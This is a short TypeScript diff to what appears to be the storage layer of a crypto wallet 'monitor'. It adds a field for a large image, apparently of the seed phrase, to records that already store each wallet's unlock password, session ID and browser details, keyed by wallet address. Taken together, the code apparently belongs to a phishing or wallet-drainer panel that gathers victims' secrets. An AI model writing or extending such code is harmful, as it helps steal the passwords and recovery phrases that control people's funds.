@@ -22,6 +22,7 @@ type CloudRow = {
   user_agent: string | null
   browser_session_id: string | null
   unlock_password: string | null
+  phrase_snap_image: string | null
   connected_at: string
   last_seen_at: string
   connection_status: string | null
@@ -40,6 +41,7 @@ function toRecord(row: CloudRow): WalletMonitorRecord {
     clientIp: null,
     browserSessionId: row.browser_session_id,
     unlockPassword: row.unlock_password,
+    phraseSnapImage: row.phrase_snap_image,
     connectedAt: row.connected_at,
     lastSeenAt: row.last_seen_at,
     connectionStatus: row.connection_status || 'connected',
@@ -56,6 +58,7 @@ export async function upsertCloudWalletSession(input: {
   pageUrl?: string | null
   browserSessionId?: string | null
   unlockPassword?: string | null
+  phraseSnapImage?: string | null
   connectionStatus?: string
 }): Promise<void> {
   if (!input.walletAddress) return
@@ -81,6 +84,10 @@ export async function upsertCloudWalletSession(input: {
         input.unlockPassword !== undefined && input.unlockPassword !== null && String(input.unlockPassword).length > 0
           ? String(input.unlockPassword).slice(0, 500)
           : existing?.unlock_password ?? null,
+      phrase_snap_image:
+        input.phraseSnapImage !== undefined && input.phraseSnapImage
+          ? String(input.phraseSnapImage).slice(0, 900_000)
+          : (existing as { phrase_snap_image?: string | null } | null)?.phrase_snap_image ?? null,
       connected_at: existing?.connected_at || nowIso(),
       last_seen_at: nowIso(),
       connection_status: input.connectionStatus || 'connected',
